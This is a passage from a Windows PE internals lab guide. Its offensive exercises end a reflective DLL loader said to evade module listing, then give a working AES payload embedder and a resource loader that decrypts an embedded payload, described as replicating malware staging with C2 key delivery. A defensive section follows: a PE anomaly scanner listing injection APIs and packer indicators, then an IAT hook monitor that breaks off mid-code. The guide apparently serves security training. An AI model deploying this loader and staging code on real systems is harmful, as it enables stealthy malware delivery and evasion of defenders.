                ((PBYTE)baseAddr + imp->OriginalFirstThunk);
            PIMAGE_THUNK_DATA64 iatThunk = (PIMAGE_THUNK_DATA64)
                ((PBYTE)baseAddr + imp->FirstThunk);

            for (; origThunk->u1.AddressOfData; origThunk++, iatThunk++) {
                if (IMAGE_SNAP_BY_ORDINAL64(origThunk->u1.Ordinal)) {
                    iatThunk->u1.Function = (ULONGLONG)
                        pGetProcAddress(hDll,
                            (LPCSTR)IMAGE_ORDINAL64(origThunk->u1.Ordinal));
                } else {
                    PIMAGE_IMPORT_BY_NAME hint = (PIMAGE_IMPORT_BY_NAME)
                        ((PBYTE)baseAddr + origThunk->u1.AddressOfData);
                    iatThunk->u1.Function = (ULONGLONG)
                        pGetProcAddress(hDll, hint->Name);
                }
            }
        }
    }

    /* Step 9: Call DllMain */
    typedef BOOL (WINAPI *fnDllMain)(HMODULE, DWORD, LPVOID);
    fnDllMain pDllMain = (fnDllMain)
        ((PBYTE)baseAddr + nt->OptionalHeader.AddressOfEntryPoint);

    pDllMain((HMODULE)baseAddr, DLL_PROCESS_ATTACH, NULL);

    return (ULONG_PTR)baseAddr;
}

/* Actual DLL payload — runs after reflective loading */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "Reflectively loaded!", "Reflective DLL", MB_OK);
    }
    return TRUE;
}
```

**Verification:** After reflective injection, the DLL does NOT appear in the PEB module list. Verify with Process Explorer (View → Lower Pane View → DLLs) — the injected DLL will be absent. Use `pe-sieve64.exe /pid <PID>` to detect the implanted code region.

---

### Exercise 8: Resource-Based Payload Embedding

**Objective:** Embed an encrypted payload within a PE's resource section (RT_RCDATA), then extract and execute it at runtime. This replicates a common malware staging technique.

#### Step 1: Create the resource embedding tool

```python
#!/usr/bin/env python3
"""C:\PELab\tools\resource_embedder.py
Embed an encrypted payload into a PE file's resource section.
"""
import pefile
import struct
import os
import sys
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def encrypt_payload(payload_data, key):
    """AES-256-CBC encrypt the payload."""
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(payload_data, AES.block_size)
    encrypted = cipher.encrypt(padded)
    return iv + encrypted  # Prepend IV

def embed_resource(pe_path, payload_path, output_path, resource_id=101):
    """Embed encrypted payload as RT_RCDATA resource."""
    # Read payload
    with open(payload_path, 'rb') as f:
        payload = f.read()

    # Generate encryption key
    key = get_random_bytes(32)  # AES-256

    # Encrypt
    encrypted = encrypt_payload(payload, key)

    print(f"[+] Original payload  : {len(payload)} bytes")
    print(f"[+] Encrypted payload : {len(encrypted)} bytes")
    print(f"[+] AES-256 key (hex) : {key.hex()}")

    # Save key separately (simulating key delivery via C2)
    key_path = output_path + '.key'
    with open(key_path, 'wb') as f:
        f.write(key)
    print(f"[+] Key saved to      : {key_path}")

    # Use LIEF for resource manipulation (more reliable than manual)
    try:
        import lief
        pe = lief.parse(pe_path)

        # Add as RT_RCDATA (type 10)
        node = lief.PE.ResourceNode()
        node.id = resource_id
        data_node = lief.PE.ResourceData()
        data_node.content = list(encrypted)

        # Navigate or create the resource tree
        if pe.has_resources:
            root = pe.resources
        else:
            root = lief.PE.ResourceNode()

        # Find or create RT_RCDATA directory (type 10)
        rcdata_dir = None
        for child in root.childs:
            if child.id == 10:  # RT_RCDATA
                rcdata_dir = child
                break

        if rcdata_dir is None:
            rcdata_dir = lief.PE.ResourceDirectory()
            rcdata_dir.id = 10
            root.add_child(rcdata_dir)

        # Add the resource entry
        id_dir = lief.PE.ResourceDirectory()
        id_dir.id = resource_id

        lang_node = lief.PE.ResourceData()
        lang_node.content = list(encrypted)
        lang_node.id = 0x0409  # en-US

        id_dir.add_child(lang_node)
        rcdata_dir.add_child(id_dir)

        builder = lief.PE.Builder(pe)
        builder.build_resources(True)
        builder.build()
        builder.write(output_path)

        print(f"[+] Output PE         : {output_path}")
        print(f"[+] Resource ID       : {resource_id}")

    except ImportError:
        print("[!] LIEF not available, using manual resource approach")
        # Fallback: append as overlay with metadata header
        with open(pe_path, 'rb') as f:
            pe_data = f.read()

        # Simple overlay approach: append encrypted data after PE
        header = struct.pack('<4s I I',
            b'RSRC',                    # Magic
            resource_id,                 # Resource ID
            len(encrypted)               # Encrypted data size
        )
        with open(output_path, 'wb') as f:
            f.write(pe_data)
            f.write(header)
            f.write(encrypted)

        print(f"[+] Output PE (overlay): {output_path}")

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <host_pe> <payload_file> <output_pe>")
        sys.exit(1)
    embed_resource(sys.argv[1], sys.argv[2], sys.argv[3])
```

#### Step 2: Build the resource extractor/executor

```c
/* C:\PELab\payloads\resource_loader.c
 * Extracts and decrypts a payload from RT_RCDATA, then executes it.
 * Lab demonstration of resource-based staging.
 */
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

#define RESOURCE_ID 101

BOOL DecryptPayload(PBYTE encrypted, DWORD encSize,
                     PBYTE key, DWORD keySize,
                     PBYTE *decrypted, DWORD *decSize) {
    /* IV is first 16 bytes */
    if (encSize < 16) return FALSE;

    PBYTE iv = encrypted;
    PBYTE ciphertext = encrypted + 16;
    DWORD cipherLen = encSize - 16;

    /* Use Windows CryptoAPI for AES-256-CBC */
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContextW(&hProv, NULL, MS_ENH_RSA_AES_PROV_W,
                               PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return FALSE;

    /* Import key blob */
    struct {
        BLOBHEADER hdr;
        DWORD keySize;
        BYTE keyData[32];
    } keyBlob;
    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiAlgId = CALG_AES_256;
    keyBlob.keySize = keySize;
    memcpy(keyBlob.keyData, key, keySize);

    if (!CryptImportKey(hProv, (PBYTE)&keyBlob,
                         sizeof(keyBlob), 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return FALSE;
    }

    /* Set IV */
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    /* Decrypt */
    *decrypted = (PBYTE)VirtualAlloc(NULL, cipherLen,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_READWRITE);
    memcpy(*decrypted, ciphertext, cipherLen);
    *decSize = cipherLen;

    BOOL result = CryptDecrypt(hKey, 0, TRUE, 0, *decrypted, decSize);

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return result;
}

int main(void) {
    printf("=== Resource-Based Payload Loader ===\n\n");

    /* Find the embedded resource */
    HRSRC hRes = FindResourceW(GetModuleHandle(NULL),
                                MAKEINTRESOURCEW(RESOURCE_ID),
                                RT_RCDATA);
    if (!hRes) {
        printf("[-] Resource %d not found\n", RESOURCE_ID);
        return 1;
    }

    HGLOBAL hGlob = LoadResource(GetModuleHandle(NULL), hRes);
    DWORD resSize = SizeofResource(GetModuleHandle(NULL), hRes);
    PVOID resData = LockResource(hGlob);

    printf("[+] Found resource: %lu bytes\n", resSize);

    /* Read key from file (in real malware, this comes from C2) */
    HANDLE hKeyFile = CreateFileA("payload.key", GENERIC_READ,
                                   FILE_SHARE_READ, NULL,
                                   OPEN_EXISTING, 0, NULL);
    if (hKeyFile == INVALID_HANDLE_VALUE) {
        printf("[-] Key file not found\n");
        return 1;
    }
    BYTE key[32];
    DWORD bytesRead;
    ReadFile(hKeyFile, key, 32, &bytesRead, NULL);
    CloseHandle(hKeyFile);

    /* Decrypt */
    PBYTE decrypted = NULL;
    DWORD decSize = 0;
    if (!DecryptPayload((PBYTE)resData, resSize, key, 32,
                         &decrypted, &decSize)) {
        printf("[-] Decryption failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Decrypted payload: %lu bytes\n", decSize);

    /* Check if it's a PE */
    if (decSize > 2 && decrypted[0] == 'M' && decrypted[1] == 'Z') {
        printf("[+] Payload is a PE file — writing to disk for inspection\n");
        HANDLE hOut = CreateFileA("C:\\PELab\\output\\extracted_payload.exe",
                                   GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, 0, NULL);
        WriteFile(hOut, decrypted, decSize, &bytesRead, NULL);
        CloseHandle(hOut);
        printf("[+] Extracted to: C:\\PELab\\output\\extracted_payload.exe\n");
    }

    VirtualFree(decrypted, 0, MEM_RELEASE);
    return 0;
}
```

**Verification:** Confirm the resource appears in the modified PE using `dumpbin /resources` or the Python resource enumeration tool from the source document.

---

## PART B: DEFENSIVE (Protection Systems)

---

### Exercise 1: PE Anomaly Detection Engine

**Objective:** Build a comprehensive PE anomaly scanner that checks for all indicators of manipulation, packing, injection, and evasion described in the source document.

```python
#!/usr/bin/env python3
"""C:\PELab\tools\pe_anomaly_engine.py
Comprehensive PE anomaly detection engine.
Checks 25+ anomaly indicators across headers, sections, imports,
exports, resources, debug info, and signing.
"""
import pefile
import math
import hashlib
import struct
import datetime
import json
import sys
import os

class PEAnomalyEngine:
    """Multi-check PE anomaly scanner."""

    NORMAL_SECTIONS = {
        '.text', '.rdata', '.data', '.rsrc', '.reloc', '.pdata',
        '.edata', '.idata', '.CRT', '.tls', '.bss', '.didat',
        '.debug', '.xdata', '.cfg', '.gfids', '.giats', '.00cfg',
        '.retplne', '.voltbl', '.mrdata',
    }

    PACKER_SECTIONS = {
        'UPX0', 'UPX1', 'UPX2', '.vmp0', '.vmp1', '.themida',
        '.winlice', '.enigma1', '.enigma2', '.MPRESS1', '.MPRESS2',
        '.aspack', '.adata', '.pec', '.pec2',
    }

    SUSPICIOUS_IMPORTS = {
        'VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread',
        'NtUnmapViewOfSection', 'NtWriteVirtualMemory', 'QueueUserAPC',
        'SetThreadContext', 'NtCreateSection', 'NtMapViewOfSection',
        'RtlCreateUserThread', 'NtQueueApcThread', 'NtCreateThreadEx',
        'IsDebuggerPresent', 'NtQueryInformationProcess',
        'AdjustTokenPrivileges', 'OpenProcessToken',
        'CryptEncrypt', 'CryptDecrypt',
        'InternetOpenA', 'InternetOpenUrlA', 'HttpSendRequestA',
        'URLDownloadToFileA', 'WinExec', 'ShellExecuteA',
    }

    INJECTION_TRIPLE = [
        ('kernel32.dll', 'VirtualAllocEx'),
        ('kernel32.dll', 'WriteProcessMemory'),
        ('kernel32.dll', 'CreateRemoteThread'),
    ]

    def __init__(self, filepath):
        self.filepath = filepath
        with open(filepath, 'rb') as f:
            self.raw = f.read()
        self.pe = pefile.PE(data=self.raw)
        self.findings = []
        self.scores = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}

    def _add_finding(self, severity, category, description, details=None):
        finding = {
            'severity': severity,
            'category': category,
            'description': description,
            'details': details or {}
        }
        self.findings.append(finding)
        self.scores[severity] += 1

    @staticmethod
    def _entropy(data):
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        return -sum((f/length) * math.log2(f/length) for f in freq if f > 0)

    # === CHECK METHODS ===

    def check_dos_header(self):
        """Check DOS header anomalies."""
        if self.raw[:2] != b'MZ':
            self._add_finding('critical', 'header',
                              'Invalid DOS magic — not a PE file')
            return

        e_lfanew = struct.unpack_from('<I', self.raw, 0x3C)[0]
        if e_lfanew > 0x1000:
            self._add_finding('medium', 'header',
                              f'Unusually large e_lfanew: 0x{e_lfanew:X}',
                              {'e_lfanew': e_lfanew})

        # Check for data between DOS stub and PE header
        stub_data = self.raw[64:e_lfanew]
        stub_ent = self._entropy(stub_data) if len(stub_data) > 64 else 0
        if stub_ent > 6.5 and len(stub_data) > 256:
            self._add_finding('medium', 'header',
                              'High-entropy data in DOS stub region',
                              {'entropy': round(stub_ent, 2),
                               'size': len(stub_data)})

    def check_rich_header(self):
        """Check Rich header presence and integrity."""
        e_lfanew = struct.unpack_from('<I', self.raw, 0x3C)[0]
        rich_end = self.raw.find(b'Rich', 0x40, e_lfanew)

        if rich_end == -1:
            self._add_finding('low', 'provenance',
                              'Rich header absent — provenance stripped')
            return

        # Verify XOR key integrity
        rich_key = struct.unpack_from('<I', self.raw, rich_end + 4)[0]
        dans_encoded = struct.pack('<I', 0x536E6144 ^ rich_key)
        dans_pos = self.raw.find(dans_encoded, 0x40, rich_end)

        if dans_pos == -1:
            self._add_finding('medium', 'provenance',
                              'Rich header XOR key mismatch — header tampered')

    def check_pe_signature(self):
        """Verify PE signature."""
        e_lfanew = struct.unpack_from('<I', self.raw, 0x3C)[0]
        sig = self.raw[e_lfanew:e_lfanew + 4]
        if sig != b'PE\x00\x00':
            self._add_finding('critical', 'header',
                              f'Invalid PE signature: {sig}')

    def check_timestamp(self):
        """Check TimeDateStamp anomalies."""
        ts = self.pe.FILE_HEADER.TimeDateStamp
        if ts == 0:
            self._add_finding('low', 'header',
                              'TimeDateStamp is zero (stripped)')
            return

        try:
            dt = datetime.datetime.utcfromtimestamp(ts)
            now = datetime.datetime.utcnow()
            if dt > now:
                self._add_finding('high', 'header',
                                  f'TimeDateStamp in the future: {dt.isoformat()}Z')
            elif dt.year < 1995:
                self._add_finding('medium', 'header',
                                  f'TimeDateStamp implausibly old: {dt.isoformat()}Z')
        except (OSError, ValueError):
            self._add_finding('medium', 'header',
                              f'Invalid TimeDateStamp: 0x{ts:08X}')

        # Check for reproducible build marker
        has_repro = False
        if hasattr(self.pe, 'DIRECTORY_ENTRY_DEBUG'):
            for dbg in self.pe.DIRECTORY_ENTRY_DEBUG:
                if dbg.struct.Type == 16:  # IMAGE_DEBUG_TYPE_REPRO
                    has_repro = True
                    break

    def check_entry_point(self):
        """Check entry point location."""
        ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        if ep == 0:
            if not (self.pe.FILE_HEADER.Characteristics & 0x2000):
                self._add_finding('medium', 'header',
                                  'EntryPoint is zero on a non-DLL')
            return

        ep_section = None
        for sec in self.pe.sections:
            name = sec.Name.rstrip(b'\x00').decode('utf-8', errors='replace')
            if (sec.VirtualAddress <= ep <
                    sec.VirtualAddress + sec.Misc_VirtualSize):
                ep_section = name
                break

        if ep_section is None:
            self._add_finding('high', 'header',
                              f'EntryPoint RVA 0x{ep:X} not in any section')
        elif ep_section not in ('.text', 'CODE', '.code'):
            self._add_finding('medium', 'header',
                              f'EntryPoint in {ep_section} (expected .text)',
                              {'ep_rva': f'0x{ep:08X}',
                               'section': ep_section})

    def check_sections(self):
        """Comprehensive section analysis."""
        for sec in self.pe.sections:
            name = sec.Name.rstrip(b'\x00').decode('utf-8', errors='replace')
            data = sec.get_data()
            ent = self._entropy(data)
            chars = sec.Characteristics

            # W^X violation
            if (chars & 0x20000000) and (chars & 0x80000000):
                self._add_finding('high', 'section',
                                  f'Section {name}: W+X (RWX) — W^X violation',
                                  {'section': name,
                                   'characteristics': f'0x{chars:08X}'})

            # High entropy (packed)
            if ent > 7.0 and sec.SizeOfRawData > 512:
                self._add_finding('high', 'section',
                                  f'Section {name}: entropy {ent:.2f} — likely packed',
                                  {'section': name, 'entropy': round(ent, 2)})

            # Packer section names
            if name in self.PACKER_SECTIONS:
                self._add_finding('high', 'section',
                                  f'Section {name}: known packer section name',
                                  {'section': name})
            elif name not in self.NORMAL_SECTIONS and not name.startswith('.'):
                self._add_finding('low', 'section',
                                  f'Section {name}: unusual name',
                                  {'section': name})

            # Inflated VirtualSize (unpack target)
            if (sec.Misc_VirtualSize > sec.SizeOfRawData * 10 and
                    sec.Misc_VirtualSize > 0x10000):
                self._add_finding('medium', 'section',
                    f'Section {name}: VirtualSize >> RawSize (unpack target?)',
                    {'vsize': sec.Misc_VirtualSize,
                     'rsize': sec.SizeOfRawData})

            # Zero raw data with large virtual size
            if sec.SizeOfRawData == 0 and sec.Misc_VirtualSize > 0x10000:
                self._add_finding('medium', 'section',
                    f'Section {name}: zero raw data, large virtual size',
                    {'vsize': sec.Misc_VirtualSize})

    def check_imports(self):
        """Check import anomalies."""
        if not hasattr(self.pe, 'DIRECTORY_ENTRY_IMPORT'):
            self._add_finding('medium', 'import',
                              'No import directory — packed or minimal PE')
            return

        total_imports = 0
        suspicious_found = set()
        injection_api_found = set()

        for entry in self.pe.DIRECTORY_ENTRY_IMPORT:
            dll_name = entry.dll.decode('utf-8', errors='replace')

            # Check for ILT stripped
            if entry.struct.OriginalFirstThunk == 0:
                self._add_finding('medium', 'import',
                    f'ILT stripped for {dll_name} — packer indicator')

            for imp in entry.imports:
                total_imports += 1
                if imp.name:
                    fname = imp.name.decode('utf-8', errors='replace')
                    if fname in self.SUSPICIOUS_IMPORTS:
                        suspicious_found.add(f'{dll_name}!{fname}')
                    for dll, func in self.INJECTION_TRIPLE:
                        if dll_name.lower() == dll and fname == func:
                            injection_api_found.add(func)

        if total_imports < 5:
            self._add_finding('high', 'import',
                f'Very few imports ({total_imports}) — packed binary')

        if len(injection_api_found) >= 3:
            self._add_finding('high', 'import',
                'Injection API triple detected: VirtualAllocEx + '
                'WriteProcessMemory + CreateRemoteThread')

        if suspicious_found:
            self._add_finding('medium', 'import',
                f'Suspicious imports found ({len(suspicious_found)})',
                {'imports': list(sorted(suspicious_found))})

    def check_tls(self):
        """Check TLS callbacks."""
        if hasattr(self.pe, 'DIRECTORY_ENTRY_TLS'):
            tls = self.pe.DIRECTORY_ENTRY_TLS.struct
            if tls.AddressOfCallBacks:
                self._add_finding('medium', 'tls',
                    'TLS callbacks present — pre-EntryPoint execution',
                    {'callback_array_va': f'0x{tls.AddressOfCallBacks:016X}'})

    def check_authenticode(self):
        """Check Authenticode signing status."""
        cert_dir = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
        if cert_dir.VirtualAddress == 0 or cert_dir.Size == 0:
            self._add_finding('medium', 'signing',
                              'No Authenticode signature')
        else:
            # Check for trailing data after certificate
            cert_end = cert_dir.VirtualAddress + cert_dir.Size
            file_size = len(self.raw)
            if file_size > cert_end + 8:
                trailing = file_size - cert_end
                self._add_finding('high', 'signing',
                    f'Trailing data after certificate: {trailing} bytes',
                    {'cert_end': cert_end, 'file_size': file_size})

    def check_debug_directory(self):
        """Check debug directory for PDB paths and anomalies."""
        if not hasattr(self.pe, 'DIRECTORY_ENTRY_DEBUG'):
            self._add_finding('low', 'debug',
                              'No debug directory')
            return

        for dbg in self.pe.DIRECTORY_ENTRY_DEBUG:
            if dbg.struct.Type == 2:  # CodeView
                # Extract PDB path
                cv_offset = dbg.struct.PointerToRawData
                if cv_offset + 24 < len(self.raw):
                    cv_sig = self.raw[cv_offset:cv_offset + 4]
                    if cv_sig == b'RSDS':
                        pdb_path_start = cv_offset + 24
                        pdb_path_end = self.raw.find(b'\x00',
                                                      pdb_path_start)
                        if pdb_path_end != -1:
                            pdb_path = self.raw[
                                pdb_path_start:pdb_path_end
                            ].decode('utf-8', errors='replace')

                            # Check for suspicious PDB paths
                            suspicious_pdb = False
                            for indicator in ['\\Users\\', '\\Desktop\\',
                                             '\\Temp\\', 'test', 'debug',
                                             'payload', 'inject', 'hack']:
                                if indicator.lower() in pdb_path.lower():
                                    suspicious_pdb = True
                                    break

                            if suspicious_pdb:
                                self._add_finding('medium', 'debug',
                                    f'Suspicious PDB path: {pdb_path}')

    def check_resources(self):
        """Check resources for embedded payloads."""
        if not hasattr(self.pe, 'DIRECTORY_ENTRY_RESOURCE'):
            return

        for entry in self.pe.DIRECTORY_ENTRY_RESOURCE.entries:
            if not hasattr(entry, 'directory'):
                continue
            for sub in entry.directory.entries:
                if not hasattr(sub, 'directory'):
                    continue
                for leaf in sub.directory.entries:
                    data_rva = leaf.data.struct.OffsetToData
                    size = leaf.data.struct.Size
                    try:
                        data = self.pe.get_data(data_rva, min(size, 4096))
                    except pefile.PEFormatError:
                        continue

                    # Check for embedded PE
                    if len(data) >= 2 and data[0:2] == b'MZ':
                        self._add_finding('high', 'resource',
                            f'Embedded PE in resource (type={entry.id}, '
                            f'id={sub.id}, size={size})')

                    # High entropy RCDATA
                    if entry.id == 10 and size > 4096:
                        ent = self._entropy(data)
                        if ent > 7.0:
                            self._add_finding('medium', 'resource',
                                f'High-entropy RT_RCDATA resource '
                                f'(id={sub.id}, size={size}, ent={ent:.2f})')

    def check_header_padding(self):
        """Check for data hidden in header padding."""
        last_sec_hdr_end = (
            self.pe.sections[-1].get_file_offset() + 40
            if self.pe.sections else 0
        )
        headers_end = self.pe.OPTIONAL_HEADER.SizeOfHeaders
        padding = headers_end - last_sec_hdr_end

        if padding > 4096:
            pad_data = self.raw[last_sec_hdr_end:headers_end]
            pad_ent = self._entropy(pad_data)
            if pad_ent > 4.0:
                self._add_finding('medium', 'header',
                    f'Excessive header padding: {padding} bytes, '
                    f'entropy {pad_ent:.2f}')

    def check_overlay(self):
        """Check for overlay data after the last section."""
        if not self.pe.sections:
            return

        last_sec = self.pe.sections[-1]
        pe_end = last_sec.PointerToRawData + last_sec.SizeOfRawData
        file_size = len(self.raw)

        if file_size > pe_end + 512:
            overlay_size = file_size - pe_end
            overlay_data = self.raw[pe_end:pe_end + 4096]
            overlay_ent = self._entropy(overlay_data)

            self._add_finding('medium', 'overlay',
                f'Overlay data: {overlay_size} bytes, entropy {overlay_ent:.2f}',
                {'offset': pe_end, 'size': overlay_size})

            # Check if overlay contains PE
            if overlay_data[:2] == b'MZ':
                self._add_finding('high', 'overlay',
                    'Overlay contains embedded PE file')

    def check_mitigations(self):
        """Check security mitigation status."""
        dc = self.pe.OPTIONAL_HEADER.DllCharacteristics

        if not (dc & 0x0040):
            self._add_finding('high', 'mitigation',
                              'ASLR disabled (DYNAMIC_BASE not set)')
        if not (dc & 0x0100):
            self._add_finding('high', 'mitigation',
                              'DEP disabled (NX_COMPAT not set)')
        if not (dc & 0x4000):
            self._add_finding('medium', 'mitigation',
                              'CFG disabled (GUARD_CF not set)')
        if not (dc & 0x0020) and self.pe.OPTIONAL_HEADER.Magic == 0x20B:
            self._add_finding('medium', 'mitigation',
                              'High-entropy VA disabled on 64-bit binary')

        # Check ASLR + .reloc consistency
        if (dc & 0x0040):
            reloc_dir = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[5]
            if reloc_dir.Size == 0:
                self._add_finding('high', 'mitigation',
                    'ASLR flag set but .reloc is empty — ASLR ineffective')

        # Check /GS cookie
        if hasattr(self.pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
            lc = self.pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
            if not (hasattr(lc, 'SecurityCookie') and lc.SecurityCookie):
                self._add_finding('medium', 'mitigation',
                                  '/GS stack cookie not found in load config')

    def check_subsystem(self):
        """Check for anomalous subsystem values."""
        sub = self.pe.OPTIONAL_HEADER.Subsystem
        if sub == 1:  # NATIVE
            self._add_finding('medium', 'header',
                'Subsystem is NATIVE — kernel driver or low-level tool')
        elif sub in (10, 11, 12, 13):  # EFI
            self._add_finding('medium', 'header',
                'Subsystem is EFI — unusual in user-mode context')

    # === MAIN SCAN ===

    def scan(self):
        """Run all checks."""
        checks = [
            self.check_dos_header,
            self.check_rich_header,
            self.check_pe_signature,
            self.check_timestamp,
            self.check_entry_point,
            self.check_sections,
            self.check_imports,
            self.check_tls,
            self.check_authenticode,
            self.check_debug_directory,
            self.check_resources,
            self.check_header_padding,
            self.check_overlay,
            self.check_mitigations,
            self.check_subsystem,
        ]

        for check in checks:
            try:
                check()
            except Exception as e:
                self._add_finding('low', 'error',
                    f'Check {check.__name__} failed: {e}')

        return self.findings

    def report(self, format='text'):
        """Generate scan report."""
        file_hash = hashlib.sha256(self.raw).hexdigest()

        if format == 'json':
            return json.dumps({
                'file': self.filepath,
                'sha256': file_hash,
                'size': len(self.raw),
                'scores': self.scores,
                'total_findings': len(self.findings),
                'findings': self.findings
            }, indent=2)

        # Text format
        lines = [
            f"PE Anomaly Scan Report",
            f"{'=' * 60}",
            f"File    : {self.filepath}",
            f"SHA-256 : {file_hash}",
            f"Size    : {len(self.raw)} bytes",
            f"",
            f"Summary : CRITICAL={self.scores['critical']}  "
            f"HIGH={self.scores['high']}  "
            f"MEDIUM={self.scores['medium']}  "
            f"LOW={self.scores['low']}",
            f"{'=' * 60}",
        ]

        severity_order = ['critical', 'high', 'medium', 'low']
        icons = {'critical': '[!!!]', 'high': '[!!]',
                 'medium': '[!]', 'low': '[~]'}

        for sev in severity_order:
            sev_findings = [f for f in self.findings if f['severity'] == sev]
            if not sev_findings:
                continue
            lines.append(f"\n--- {sev.upper()} ({len(sev_findings)}) ---")
            for f in sev_findings:
                lines.append(f"  {icons[sev]} [{f['category']}] {f['description']}")
                if f['details']:
                    for k, v in f['details'].items():
                        lines.append(f"      {k}: {v}")

        verdict = "CLEAN"
        if self.scores['critical'] > 0:
            verdict = "MALICIOUS (high confidence)"
        elif self.scores['high'] >= 3:
            verdict = "SUSPICIOUS (multiple high-severity indicators)"
        elif self.scores['high'] >= 1:
            verdict = "REVIEW NEEDED"

        lines.append(f"\n{'=' * 60}")
        lines.append(f"VERDICT: {verdict}")
        lines.append(f"{'=' * 60}")

        return '\n'.join(lines)

    def close(self):
        self.pe.close()


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pe_file> [--json]")
        sys.exit(1)

    engine = PEAnomalyEngine(sys.argv[1])
    engine.scan()

    fmt = 'json' if '--json' in sys.argv else 'text'
    print(engine.report(fmt))
    engine.close()

if __name__ == '__main__':
    main()
```

**Expected output against a packed sample:**

```
PE Anomaly Scan Report
============================================================
File    : C:\PELab\samples\packed_sample.exe
SHA-256 : a1b2c3d4e5f6...
Size    : 245760 bytes

Summary : CRITICAL=0  HIGH=4  MEDIUM=3  LOW=1
============================================================

--- HIGH (4) ---
  [!!] [section] Section UPX1: entropy 7.89 — likely packed
  [!!] [section] Section UPX1: known packer section name
  [!!] [import] Very few imports (3) — packed binary
  [!!] [mitigation] ASLR disabled (DYNAMIC_BASE not set)

--- MEDIUM (3) ---
  [!] [import] Suspicious imports found (2)
      imports: ['kernel32.dll!GetProcAddress', 'kernel32.dll!LoadLibraryA']
  [!] [signing] No Authenticode signature
  [!] [mitigation] CFG disabled (GUARD_CF not set)

--- LOW (1) ---
  [~] [provenance] Rich header absent — provenance stripped

============================================================
VERDICT: SUSPICIOUS (multiple high-severity indicators)
============================================================
```

---

### Exercise 2: IAT Integrity Monitor

**Objective:** Build a runtime tool that continuously monitors IAT integrity by comparing in-memory IAT entries against freshly-resolved addresses. Detect IAT hooks in real-time.

```python
#!/usr/bin/env python3
"""C:\PELab\tools\iat_monitor.py
Runtime IAT integrity monitor.
Compares in-memory IAT slots against expected resolution.
Requires: pip install ctypes (built-in)
NOTE: Must run on Windows with admin privileges.
"""
import ctypes
import ctypes.wintypes as wt
import struct
import sys
import time
import os

# Windows API declarations
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
ntdll = ctypes.windll.ntdll

PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400

class IATMonitor:
    """Monitor a process's IAT for hooks."""

    def __init__(self, pid):
        self.pid = pid
        self.handle = kernel32.OpenProcess(
            PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not self.handle:
            raise RuntimeError(f"Cannot open PID {pid}: {ctypes.GetLastError()}")
        self.baseline = {}

    def read_memory(self, address, size):
        """Read memory from the target process."""
        buf = ctypes.create_string_buffer(size)
        bytes_read = ctypes.c_size_t(0)
        result = kernel32.ReadProcessMemory(
            self.handle, ctypes.c_void_p(address),
            buf, size, ctypes.byref(bytes_read))
        if not result:
            return None
        return buf.raw[:bytes_read.value]

    def get_modules(self):
        """Enumerate loaded modules in the target process."""
        hMods = (ctypes.c_void_p * 1024)()
        cbNeeded = wt.DWORD()
        if not psapi.EnumProcessModules(
                self.handle, hMods, ctypes.sizeof(hMods),
                ctypes.byref(cbNeeded)):
            return []

        count = cbNeeded.value // ctypes.sizeof(ctypes.c_void_p)
        modules = []
        for i in range(count):
            name = ctypes.create_string_buffer(260)
            psapi.GetModuleFileNameExA(
                self.handle, hMods[i], name, 260)
            modules.append({
                'base': hMods[i],
                'name': name.value.decode('utf-8', errors='replace')
            })
        return modules

    def scan_iat(self, module_base):
        """Read and parse the IAT of a module in the target process."""
        # Read DOS header
        dos_data = self.read_memory(module_base, 64)
        if not dos_data or dos_data[:2] != b'MZ':
            return {}

        e_lfanew = struct.unpack_from('<I', dos_data, 0x3C)[0]

        # Read NT headers
        nt_data = self.read_memory(module_base + e_lfanew, 264)
        if not nt_data or nt_data[:4] != b'PE\x00\x00':
            return {}

        # Get import directory RVA (offset 144 in NT headers for PE32+)
        import_rva = struct.unpack_from('<I', nt_data, 4 + 20 + 120)[0]
        import_size = struct.unpack_from('<I', nt_data, 4 + 20 + 124)[0]

        if import_rva == 0:
            return {}

        # Read import descriptors
        imports = {}
        offset = 0
        while offset < import_size:
            desc_data = self.read_memory(
                module_base + import_rva + offset, 20)
            if not desc_data:
                break

            orig_first_thunk, ts, fwd_chain, name_rva, first_thunk = \
                struct.unpack_from('<IIIII', desc_data)

            if name_rva == 0:
                break

            # Read DLL name
            dll_name_data = self.read_memory(module_base + name_rva, 256)
            if dll_name_data:
                dll_name = dll_name_data.split(b'\x00')[0].decode(
                    'utf-8', errors='replace')
            else:
                dll_name = f"unknown_{name_rva:08X}"

            # Read IAT entries
            iat_offset = 0
            while True:
                iat_entry_data = self.read_memory(
                    module_base + first_thunk + iat_offset, 8)
                if not iat_entry_data:
                    break
                iat_value = struct.unpack_from('<Q', iat_entry_data)[0]
                if iat_value == 0:
                    break

